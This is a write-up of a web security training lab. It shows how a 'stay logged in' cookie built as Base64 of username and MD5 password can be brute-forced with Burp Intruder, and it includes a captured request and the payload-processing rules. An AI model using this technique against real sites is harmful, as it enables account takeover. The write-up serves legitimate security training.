## Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his My account page.

Your credentials: wiener:peter

Victim's username: carlos

Candidate passwords

## Notes

- Possibility to leave a comment on a post
- Stay-Logged-In functionality
- /login

## Resume

1. Login with `wiener:peter` using **Stay logged in**
2. Decode the `stay-logged-in` cookie
3. Identify cookie structure
4. Capture authenticated request to Carlos's profile
5. Send request to Intruder
6. Use payload processing rules to generate cookies
7. Bruteforce cookie using candidate passwords
8. Filter by response length to identify successful authentication

## Solve

Login using `wiener:peter` with the **Stay logged in** option enabled.

Inspect the generated cookie and decode it from Base64:

```txt
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

The second value is an MD5 hash of the password `peter`.

The cookie format is:

```txt
base64(username:md5(password))
```

Now capture the following request and send it to Intruder:

```http
GET /my-account?id=carlos HTTP/2
Host: 0af700e403a9f76d80dffd7c002c00ea.web-security-academy.net
Cookie: stay-logged-in=Y2FybG9zOjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0af700e403a9f76d80dffd7c002c00ea.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

Select only the value of the `stay-logged-in` cookie as payload position.

In **Payloads**, add the candidate password wordlist.

Then configure **Payload processing** with the following rules in order:

1. **Hash** → MD5
2. **Add prefix** → `carlos:`
3. **Encode** → Base64-encode

Run the attack.

Filter responses using the **Length** column. One response length will differ from the others because it loads Carlos's authenticated profile page instead of the login page.

The corresponding payload is Carlos's password.